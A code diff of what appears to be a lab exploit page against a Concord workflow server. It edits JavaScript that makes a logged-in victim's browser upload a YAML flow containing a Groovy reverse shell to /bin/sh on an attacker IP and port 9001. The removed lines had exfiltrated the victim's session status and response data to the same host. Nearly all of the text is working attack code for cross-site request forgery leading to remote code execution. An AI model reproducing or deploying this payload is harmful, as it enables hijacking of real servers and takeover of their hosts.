@@ -9,7 +9,7 @@ flows:
   default:
   - script: groovy
     body: |
-      String host="192.168.45.187";
+      String host="192.168.45.205";
       int port=9001;
       String cmd="/bin/sh";
       Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
@@ -37,20 +37,6 @@ flows:
       s.close();
 `
 
-fetch("http://concord:8001/api/service/console/whoami", {
-	credentials: 'include'
-})
-.then(async (response) => {
-	if(response.status != 401){
-		let data = await response.text();
-		fetch("http://192.168.45.205/?msg=" + data );
-		rce();
-	}else{
-		fetch("http://192.168.45.205/?msg=UserNotLoggedIn" )
-		rce();
-	}
-})
-
 rce = () => {
 	var ymlBlob = new Blob([yml], {type: "application/yml"});
 	var fd = new FormData();
@@ -59,13 +45,10 @@ rce = () => {
 		credentials: "include",
 		method: "POST",
 		body: fd
-	}).then (response => response.text())
-	.then(data => {
-		fetch("http://192.168.45.205/?msg=" + data);
-	}).catch(err => {
-		fetch("http://192.168.45.205/?err=" + err);
-	});
-}
+	})
+};
+
+rce();
 </script>
 </head>
  
